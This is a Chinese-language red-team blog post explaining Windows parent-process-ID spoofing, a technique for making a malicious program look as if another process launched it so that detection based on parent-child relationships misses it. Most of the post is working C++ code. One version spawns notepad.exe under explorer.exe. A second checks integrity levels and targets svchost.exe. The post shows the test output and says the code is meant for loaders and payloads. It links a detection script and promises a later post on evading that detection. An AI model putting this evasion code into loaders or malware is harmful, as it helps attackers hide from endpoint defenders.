---
title:  ppid 伪造(一)
pubDate: 2025-03-10
categories: ['Red Team']
description: 'PPID伪造技术使恶意程序看起来由其他进程产生，主要用于逃避基于父子进程关系的检测。Windows无法直接修改PPID，只能在创建新进程时指定父进程句柄。通常用于加载器或payload中。伪造方法包括构造检索目标父进程PID的函数，测试显示可成功弹出记事本。但存在权限限制，当目标父进程完整性级别超过标准用户时无法访问。伪造的PPID可被检测工具识别，但父进程欺骗可绕过父子进程关系检测，减少被发现可能。'
slug:
---

让恶意的程序看起来是由另一个进程产生的，主要用于逃避基于父子进程关系的检测

Windows 不能直接修改 ppid，只能在创建新进程时指定父进程句柄

## 使用环节

通常使用在加载器中，也可以存在 payload 中或者将加载器和 payload 一同送进目标主机

## 伪造方法

首先构造一个能够检索目标父进程的 pid 的函数，这样可以减少手动操作的不便

```cpp
// 检索目标父进程的pid
DWORD getPPID(LPCWSTR processName)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);
    if (Process32First(snapshot, &process))
    {
        do
        {
            if (!wcscmp(process.szExeFile, processName))
                break;
        } while (Process32Next(snapshot, &process));
    }
    CloseHandle(snapshot);
    return process.th32ProcessID;
}
```

主函数中进行调用

```cpp
#include <iostream>
#include <windows.h>
#include <tlHelp32.h>

int main()
{
    STARTUPINFOEX si = { sizeof(STARTUPINFOEX) };
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    // 通过函数 getPPID 获取目标父进程的 pid
    // 输入目标进程的名称
    LPCWSTR parentProcess = L"explorer.exe";
    DWORD parentPID = getPPID(parentProcess);
    printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, parentPID);

    // 这里末尾的数字是目标父进程的 pid，可以自定义函数获取
    HANDLE expProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPID);
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expProcess, sizeof(expProcess), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    // 这里添加目标子进程的路径或者启动命令
    LPCWSTR spawnProcess = L"C:\\Windows\\System32\\notepad.exe";
    CreateProcess(spawnProcess, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
    printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);
    return 0;
}
```

### 测试结果

可以看到伪造成功了，弹出了记事本

```
[+] Spoofing explorer.exe (PID: 12048) as the parent process.
[+] Spawning C:\Windows\System32\notepad.exe (PID: 32968)
```

## 权限问题

如果目标父进程的完整性级别超过了标准用户，我们就无权访问这样的进程。

此时，我们就希望能有一个函数能够帮助我们检查进程的完整性级别，这个操作使用的函数为 GetTokenInformation，它能够检索与进程关联的访问令牌的信息

修改后的代码如下

```cpp
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <atlconv.h>
using namespace std;

// 异常处理
string get_last_error(DWORD errCode)
{
	string err("");
	if (errCode == 0) errCode = GetLastError();
	LPTSTR lpBuffer = NULL;
	if (0 == FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, //标志位，决定如何说明lpSource参数，
																					// dwFlags的低位指定如何处理换行功能在输出缓冲区，也决定最大宽度的格式化输出行,可选参数
		NULL,	// 根据dwFlags标志而定
		errCode,	// 请求的消息的标识符
					// 当dwFlags标志为FORMAT_MESSAGE_FROM_STRING时会被忽略
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),	//请求的消息的语言标识符
		(LPTSTR)&lpBuffer,	//接收错误信息描述的缓冲区指针
		0,	//如果FORMAT_MESSAGE_ALLOCATE_BUFFER标志没有被指定，这个参数必须指定为输出缓冲区的大小，如果指定值为0，这个参数指定为分配给输出缓冲区的最小数
		NULL	//保存格式化信息中的插入值的一个数组
	))
	{//失败
		char tmp[100] = { 0 };
		sprintf_s(tmp, "{未定义错误描述(%d)}", errCode);
		err = tmp;
	}
	else    //成功
	{
		USES_CONVERSION;
		err = W2A(lpBuffer);
		LocalFree(lpBuffer);
	}
	return err;
}

// 检查进程的完整性级别
LPCWSTR getProcessIntegrityLevel(HANDLE hProcess, PDWORD pdwIntegrityLevel)
{
	DWORD dwError = ERROR_SUCCESS;
	HANDLE hToken = NULL;
	DWORD cbTokenIL = 0;
	PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
	if (pdwIntegrityLevel == NULL)
	{
		dwError = ERROR_INVALID_PARAMETER;
		goto Cleanup;
	}
	// 以TOKEN_QUERY开启此线程的主访问令牌。
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		cout << "[!] OpenProcessToken error!" << endl;
		dwError = GetLastError();
		goto Cleanup;
	}
	// 查询令牌完整性级别信息的大小。注意：我们预期得到一个FALSE结果及错误
	// ERROR_INSUFFICIENT_BUFFER， 这是由于我们在GetTokenInformation输入一个
	// 空缓冲。同时，在cbTokenIL中我们会得知完整性级别信息的大小。
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL))
	{
		if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
		{
			// 当进程运行于Windows Vista之前的系统中，GetTokenInformation返回
			// FALSE和错误码ERROR_INVALID_PARAMETER。这是由于这些操作系统不支
			// 持TokenElevation。
			cout << "[!] GetTokenInformation no support !" << endl;
			dwError = GetLastError();
			goto Cleanup;
		}
	}
	// 现在我们为完整性级别信息分配一个缓存。
	pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
	if (pTokenIL == NULL)
	{
		cout << "[!] pTokenIL is null" << endl;
		dwError = GetLastError();
		goto Cleanup;
	}
	// 获得令牌完整性级别信息。
	if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL,
		cbTokenIL, &cbTokenIL))
	{
		cout << "[!] GetTokenInformation error !" << endl;
		dwError = GetLastError();
		goto Cleanup;
	}
	// 完整性级别SID为S-1-16-0xXXXX形式。（例如：S-1-16-0x1000表示为低完整性
	// 级别的SID）。而且有且仅有一个次级授权信息。
	*pdwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);
Cleanup:
	// 集中清理所有已分配的内存资源
	if (hToken)
	{
		CloseHandle(hToken);
		hToken = NULL;
	}
	if (pTokenIL)
	{
		LocalFree(pTokenIL);
		pTokenIL = NULL;
		cbTokenIL = 0;
	}
	if (ERROR_SUCCESS != dwError)
	{
		// 失败时确保此能够获取此错误代码
		SetLastError(dwError);
		return L"ERROR";
	}
	else
	{
		if (*pdwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
			return L"LOW";
		}
		else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && *pdwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
			return L"MEDIUM";
		}
		else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
			return L"HIGH";
		}
		else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
			return L"SYSTEM";
		}
	}
}
DWORD getPPID(LPCWSTR processName) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);
	bool flag = false;
	if (Process32First(snapshot, &process)) {
		do {
			if (!wcscmp(process.szExeFile, processName)) {
				HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
				if (hProcess) {
					LPCWSTR integrityLevel = NULL;
					DWORD dwIntegrityLevel;
					integrityLevel = getProcessIntegrityLevel(hProcess, &dwIntegrityLevel);
					if (!wcscmp(integrityLevel, L"ERROR")) {
						cout << "[!] PID = " << process.th32ProcessID << " GetProcessIntegrityLevel failed, Error: " << get_last_error(GetLastError()) << endl;
						continue;
					}
					if (!wcscmp(integrityLevel, L"MEDIUM")) {
						flag = true;
						break;
					}
				}
			}
		} while (Process32Next(snapshot, &process));
	}
	CloseHandle(snapshot);
	// 没有找到 MEDIUM 权限的进程
	if (!flag) {
		cout << processName << " does have medium integrity level!!" << endl;
		exit(-1);
	}
	return process.th32ProcessID;
}
int main() {
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	// 通过函数 getPPID 获取目标父进程的 pid
	// 输入目标进程的名称
	LPCWSTR parentProcess = L"svchost.exe";
	DWORD parentPID = getPPID(parentProcess);
	printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, parentPID);

	// 这里末尾的数字是目标父进程的 pid，可以自定义函数获取
	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, parentPID);
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// 这里添加目标子进程的路径或者启动命令
	LPCWSTR spawnProcess = L"C:\\Windows\\System32\\notepad.exe";
	CreateProcess(spawnProcess, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
	printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);
	return 0;
}
```

## 对抗检测

用这种方法伪造的 ppid 是能够被检测到的

[https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py](https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py)

父进程欺骗绕过可以绕过脚本对于父子原进程关系的检测，减少被发现的可能，这个过几天写
